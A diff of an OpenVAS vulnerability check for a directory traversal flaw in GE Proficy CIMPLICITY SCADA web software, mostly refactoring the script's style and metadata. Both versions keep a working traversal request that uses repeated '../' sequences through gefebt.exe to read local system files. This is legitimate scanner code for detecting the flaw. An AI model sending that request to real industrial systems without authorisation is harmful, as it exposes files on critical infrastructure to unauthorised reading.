@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ge_intelligent_mult_vulns_09_13.nasl 5627 2017-03-20 15:22:38Z cfi $
+# $Id: gb_ge_intelligent_mult_vulns_09_13.nasl 5699 2017-03-23 14:53:33Z cfi $
 #
 # GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities
 #
@@ -25,8 +25,6 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103785";
-
 tag_insight = "General Electric (GE) has addressed two vulnerabilities in GE Intelligent
 Platforms Proficy HMI/SCADA-CIMPLICITY: a directory transversal vulnerability and improper
 input validation vulnerability.
@@ -49,22 +47,17 @@ tag_vuldetect = "Send a maliciously crafted HTTP request to read a local file.";
 
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103785");
  script_cve_id("CVE-2013-0653","CVE-2013-0654");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 5627 $");
-
+ script_version ("$Revision: 5699 $");
  script_name("GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities");
-
-
  script_xref(name:"URL", value:"http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02");
  script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15153");
  script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15244");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:22:38 +0100 (Mon, 20 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:53:33 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2013-09-11 14:38:23 +0200 (Wed, 11 Sep 2013)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -86,37 +79,30 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
 
-banner = get_http_banner(port:port);
-if("Server: CIMPLICITY" >!< banner)exit(0);
-
-dirs = make_list("/CimWeb",cgi_dirs());
+banner = get_http_banner( port:port );
+if( "Server: CIMPLICITY" >!< banner ) exit( 0 );
 
 files = traversal_files('windows');
 
-foreach dir (dirs) {
-   
+foreach dir( make_list_unique( "/CimWeb", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
   url = dir + '/index.html';
+  buf = http_get_cache( item:url, port:port );
 
-  if(http_vuln_check(port:port, url:url, pattern:"gefebt.exe")) {
-
-    foreach file(keys(files)) {
-
+  if( "gefebt.exe" >< buf ) {
+    foreach file( keys( files ) ) {
       url = dir + '/gefebt.exe?substitute.bcl+FILE=' + crap(data:"../",length:6*9) + files[file];
-
-      if(http_vuln_check(port:port, url:url, pattern:file, check_header:TRUE)) {
+      if( http_vuln_check( port:port, url:url, pattern:file, check_header:TRUE ) ) {
         report = report_vuln_url( port:port, url:url );
-        security_message(port:port, data:report);
-        exit(0);
-      }  
-
-    }  
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
-
+exit( 99 );
